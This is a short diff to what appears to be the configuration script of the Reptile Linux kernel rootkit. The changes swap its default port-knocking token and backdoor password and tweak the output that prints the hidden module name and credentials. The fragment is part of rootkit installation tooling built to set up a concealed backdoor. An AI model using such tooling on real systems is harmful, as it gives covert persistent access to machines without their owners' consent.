@@ -108,10 +108,10 @@ function reptile_init {
 	MODULE=$RETVAL
 	DRIVER_DIRECTORY="/lib/modules/$KERNEL_VERSION/kernel/drivers/$DRIVER/$MODULE"
 
-	load_config "Auth token to port-knocking" "F0rb1dd3n"
+	load_config "Auth token to port-knocking" "hax0r"
 	TOKEN=$RETVAL
 	
-	load_config "Backdoor password" "hax0r"
+	load_config "Backdoor password" "s3cr3t"
 	PASS=$RETVAL
 	
 	load_config "Tag name that hide file contents" "reptile"
@@ -128,7 +128,7 @@ function reptile_init {
 
 	MAGIC_ID=$[ ( $RANDOM % ( $[ 99999999 - 1337 ] + 1 ) ) + 1337 ] 
 
-	echo -e "Hide name: \e[01;36m$MODULE\e[00m"
+	echo -e "\nHide name: \e[01;36m$MODULE\e[00m"
 	echo -e "Token: \e[01;36m$TOKEN\e[00m"
 	echo -e "Backdoor password: \e[01;36m$PASS\e[00m"
 	echo -e "SRC port: \e[01;36m$SRCPORT\e[00m"
